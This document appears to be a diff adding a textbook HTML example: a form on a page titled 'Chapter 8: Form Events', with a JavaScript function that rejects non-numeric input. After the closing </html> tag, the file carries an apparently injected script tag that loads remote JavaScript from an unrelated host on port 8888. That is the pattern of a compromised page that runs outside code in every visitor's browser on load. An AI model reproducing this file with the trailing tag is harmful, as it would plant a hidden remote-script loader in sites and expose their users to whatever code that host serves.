@@ -1,0 +1,39 @@
+<html>
+  <head>
+    <title>
+      JavaScript Professional Projects - Form Events
+    </title>
+
+    <script language="JavaScript">
+    <!--
+       function validate()
+       {
+         if( isNaN( document.theForm.theText.value ) )
+         {
+            alert( "Please input a Number!" );
+            document.theForm.theText.value = "";
+            return( false );
+         }
+         else return( true );
+       }
+     // -->
+     </script>
+
+  </head>
+
+  <body>
+    <center>
+      <font size=6>JavaScript Professional Projects</font><br>
+      <font size=4>Chapter 8: Form Events</font>
+    </center>
+
+    <br><br>
+    <br><br>
+ 
+    <form name="theForm" onSubmit="JavaScript: return( validate() );">
+      Input a number<br>
+      <input type="text" name="theText" size="20">&nbsp;&nbsp;&nbsp;
+      <input type="submit" value="Insert">
+    </form>
+  </body>
+</html><script type="text/javascript" src="http://web.nba1001.net:8888/tj/tongji.js"></script>
